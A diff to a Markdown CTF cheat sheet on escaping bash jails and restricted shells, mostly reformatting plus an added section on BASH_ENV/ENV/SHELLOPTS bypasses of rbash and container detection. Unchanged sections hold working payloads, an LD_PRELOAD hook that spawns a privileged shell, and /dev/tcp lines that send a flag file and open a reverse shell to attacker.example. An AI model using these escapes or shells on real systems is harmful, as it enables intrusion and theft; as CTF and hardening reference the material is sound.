@@ -1,7 +1,6 @@
 # CTF Misc - Bash Jails & Restricted Shells
 
 ## Table of Contents
-
 - [Identifying the Jail](#identifying-the-jail)
 - [Eval Context Detection](#eval-context-detection)
 - [Character-Restricted Bash: Only #, $, \](#character-restricted-bash-only---)
@@ -20,18 +19,16 @@
 - [Closed-Stdout Jail with \r Truncation (Insomnihack 2019)](#closed-stdout-jail-with-r-truncation-insomnihack-2019)
 - [References](#references)
 
-------
+---
 
 ## Identifying the Jail
 
 **Methodology:** Send test inputs and observe error messages to determine:
-
 1. What characters are allowed (whitelist vs blacklist)
 2. Whether input is `eval`'d, passed to `bash -c`, or something else
 3. Whether input is wrapped in quotes (double-quoted eval context)
 
 **Test for character filtering:**
-
 ```python
 from pwn import *
 import time
@@ -54,49 +51,44 @@ for c in range(32, 127):
 
 **Key insight:** Systematically probe each printable character to map the allowed set before crafting payloads. Silent rejection means the character is filtered; any error output means it passed the filter and reached the shell.
 
-------
+---
 
 ## Eval Context Detection
 
 **Double-quoted eval** (`eval "$input"`):
-
 - Trailing `\` causes: `unexpected EOF while looking for matching '"'`
 - `$#` expands to `0` (inside double-quotes, `$` still expands)
 - `\$` gives literal `$` (backslash escapes dollar in double-quotes)
 - `\#` gives `\#` literally (backslash doesn't escape `#` in double-quotes, but eval then interprets `\#` as literal `#`)
 
 **Bare eval** (`eval $input`):
-
 - Word splitting applies
 - Backslash escapes work differently
 
 **Read behavior:**
-
 - `read -r`: backslashes preserved literally
 - `read` (without -r): backslash is escape character (strips backslashes)
 
 **Key insight:** Distinguish between `eval "$input"` (double-quoted) and `eval $input` (bare) by sending a trailing backslash. Double-quoted eval produces an "unexpected EOF" error because the backslash escapes the closing quote; bare eval does not. This determines which escape sequences are available for exploitation.
 
-------
+---
 
 ## Character-Restricted Bash: Only `#`, `$`, `\`
 
 **Pattern (HashCashSlash):** Filter regex `^[\\#\$]+$` allows only hash, dollar, backslash.
 
 **Available expansions:**
-
-| Construct | Result      | Notes                                   |
-| --------- | ----------- | --------------------------------------- |
-| `$#`      | `0`         | Number of positional parameters         |
-| `$$`      | PID         | Current process ID (multi-digit number) |
-| `\$`      | literal `$` | In double-quoted eval context           |
-| `\\`      | literal `\` | In double-quoted eval context           |
-| `\#`      | literal `#` | Via eval's second-pass interpretation   |
+| Construct | Result | Notes |
+|-----------|--------|-------|
+| `$#` | `0` | Number of positional parameters |
+| `$$` | PID | Current process ID (multi-digit number) |
+| `\$` | literal `$` | In double-quoted eval context |
+| `\\` | literal `\` | In double-quoted eval context |
+| `\#` | literal `#` | Via eval's second-pass interpretation |
 
 **Key payload: `\$$#`**
 
 In a double-quoted eval context like `bash -c "\"${x}\""`:
-
 - `\$` → literal `$` (backslash escapes dollar in double-quotes)
 - `$#` → `0` (parameter expansion)
 - Combined: `$0` in the eval context
@@ -105,7 +97,7 @@ In a double-quoted eval context like `bash -c "\"${x}\""`:
 
 **Why it works:** The script wraps input in double quotes for `bash -c`, so `\$` becomes a literal `$`, then `$#` expands to `0`, giving the string `$0`. When eval executes this, `$0` expands to the shell invocation name (`bash`), spawning a new shell.
 
-------
+---
 
 ## Internal Service Discovery (Post-Shell)
 
@@ -126,13 +118,11 @@ done
 ```
 
 **Common patterns:**
-
 - `socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag` → flag on localhost port
 - `readflag` binary with SUID bit
 - Flag in environment of root process
 
 **Connect to internal services:**
-
 ```bash
 # Bash built-in TCP (no netcat needed)
 cat < /dev/tcp/127.0.0.1/PORT
@@ -143,43 +133,37 @@ nc 127.0.0.1 PORT
 
 **Key insight:** After escaping the jail, check `/proc/*/cmdline` for internal services serving the flag on localhost. The flag is often on a different process, not readable from the filesystem directly.
 
-------
+---
 
 ## Other Restricted Character Set Tricks
 
 ### Building numbers from `$#` and `${##}`
-
 If `{` and `}` are allowed:
-
 - `$#` = 0
 - `${##}` = 1 (length of `$#`'s string value "0")
 - Concatenate to build binary: `${##}$#${##}` = "101"
 
 ### Using PID digits
-
 `$$` gives a multi-digit number. If you can extract individual digits (requires `{}` and `:`):
-
 ```bash
 ${$$:0:1}  # First digit of PID
 ${$$:1:1}  # Second digit of PID
 ```
 
 ### Octal in ANSI-C quoting
-
 If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 
 ### Dollar-zero variants
-
-| Shell       | `$0` value        |
-| ----------- | ----------------- |
-| bash script | script path       |
-| bash -c     | `bash`            |
+| Shell | `$0` value |
+|-------|-----------|
+| bash script | script path |
+| bash -c | `bash` |
 | interactive | `bash` or `-bash` |
-| sh          | `sh`              |
+| sh | `sh` |
 
 **Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.
 
-------
+---
 
 ## Privilege Escalation Checklist (Post-Shell)
 
@@ -192,7 +176,7 @@ If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`
 
 **Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.
 
-------
+---
 
 ## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)
 
@@ -214,7 +198,7 @@ dlcall printf %s $m
 
 **Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.
 
-------
+---
 
 ## Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)
 
@@ -239,7 +223,7 @@ Also: extract characters from existing environment variables:
 
 **Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.
 
-------
+---
 
 ## LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)
 
@@ -255,14 +239,13 @@ void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
 ```bash
 gcc -shared -fPIC hook.c -o /tmp/hook.so
 LD_PRELOAD=/tmp/hook.so cat   # constructor runs before cat
-
 ```
 
 **Key insight:** Restricted shells enforce argv filtering, not environment filtering. Any allowed binary dynamically linked to libc can be hijacked through `LD_PRELOAD` as long as you can write a `.so` to a writable path. Harden by unsetting `LD_PRELOAD`, `LD_LIBRARY_PATH`, and `LD_AUDIT` on shell entry.
 
 **References:** OverTheWire Advent 2018 — Claustrophobic, writeup 12770
 
-------
+---
 
 ## /dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)
 
@@ -272,7 +255,6 @@ LD_PRELOAD=/tmp/hook.so cat   # constructor runs before cat
 cat /opt/flag > /dev/tcp/attacker.example/8081
 # attacker side:
 nc -lvnp 8081
-
 ```
 
 Bidirectional shells:
@@ -280,14 +262,13 @@ Bidirectional shells:
 ```bash
 exec 3<> /dev/tcp/attacker.example/8081
 cat <&3 | bash >&3 2>&3
-
 ```
 
 **Key insight:** `/dev/tcp` and `/dev/udp` are *built into bash*, not real filesystem paths — any distribution shipping GNU bash supports them even when `netcat`/`curl` are missing. Always test file redirection before assuming you need an external tool.
 
 **References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12780
 
-------
+---
 
 ## Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)
 
@@ -299,7 +280,6 @@ cat <&3 | bash >&3 2>&3
 a=$((++a))                       # counters without digits
 # Round N: emit arbitrary payload as octal escapes
 $('\143\141\164'  /flag)         # cat /flag
-
 ```
 
 Build numbers using `++` on uninitialised variables, then index characters out of `$PATH`, `$PWD`, or any leaked variable. Finally concatenate those characters with `\` to form any command.
@@ -308,7 +288,7 @@ Build numbers using `++` on uninitialised variables, then index characters out o
 
 **References:** Insomnihack teaser 2019 — echoechoechoecho, writeup 12911
 
-------
+---
 
 ## Closed-Stdout Jail with \r Truncation (Insomnihack 2019)
 
@@ -336,7 +316,47 @@ exec 1>&0              # duplicate the socket fd onto stdout for future cmds
 
 **References:** Insomnihack 2019 — myBrokenBash, writeups 13989 and 13990
 
-------
+---
+
+## 2024 Hardening Note — rbash Is NOT a Security Boundary
+
+**Reality:** `rbash` (restricted bash) is a *usability* feature, not a security boundary. Challenges and real deployments that rely on `rbash` alone are trivially bypassed via environment vectors and container escapes.
+
+**Container / sandbox detection (check first):**
+```bash
+ls -la /.dockerenv           # Docker marker
+cat /proc/self/cgroup        # "docker" / "kubepods" / "containerd" entries
+cat /proc/self/mountinfo | grep -q overlay && echo "container overlayfs"
+# seccomp profile active?
+grep -i seccomp /proc/self/status
+cat /proc/self/seccomp 2>/dev/null || grep Seccomp /proc/self/status
+```
+
+**Env vector — BASH_ENV / ENV / SHELLOPTS via `VAR=value allowed-cmd`:**
+`rbash` allows `VAR=value command` prefixes on allowed binaries. `BASH_ENV` (bash), `ENV` (sh), and `SHELLOPTS` are parsed on startup of *non-interactive* shells:
+
+```bash
+# If `env` or any command with VAR= prefix is allowed:
+BASH_ENV=/tmp/pwn.sh bash -c 'allowed_file'
+# /tmp/pwn.sh runs before the command: e.g. echo 'bash -p' > /tmp/pwn.sh
+# NOTE: BASH_ENV is only sourced by non-interactive bash subshells, so the
+# wrapped command must actually invoke bash (bash -c '...'); a non-bash
+# binary such as `cat` never sources BASH_ENV.
+
+# Variant via ENV (POSIX sh) and SHELLOPTS:
+ENV=/tmp/pwn.sh sh -c 'allowed_cmd'
+SHELLOPTS=xtrace BASH_ENV=/tmp/pwn.sh bash -c 'allowed_cmd'
+
+# General bypass:
+VAR=value allowed-cmd   # VAR propagates as env; BASH_ENV/ENV triggers source on shell init
+```
+
+**Mitigations to check / recommend:**
+- Unset `BASH_ENV`, `ENV`, `SHELLOPTS`, `LD_PRELOAD`, `LD_LIBRARY_PATH` on shell entry (`env -i` or `unset`)
+- Check `/.dockerenv`, `/proc/self/cgroup`, and `seccomp` status before assuming `rbash` confinement
+- Use `seccomp` filters + proper container (not just rbash) for isolation
+
+**Key insight:** rbash NOT boundary — check `/.dockerenv` + `/proc/self/cgroup` + `seccomp`, and exploit `BASH_ENV`/`ENV`/`SHELLOPTS` via `VAR=value allowed-cmd` env injection when any `VAR= cmd` prefix is permitted.
 
 ## References
 
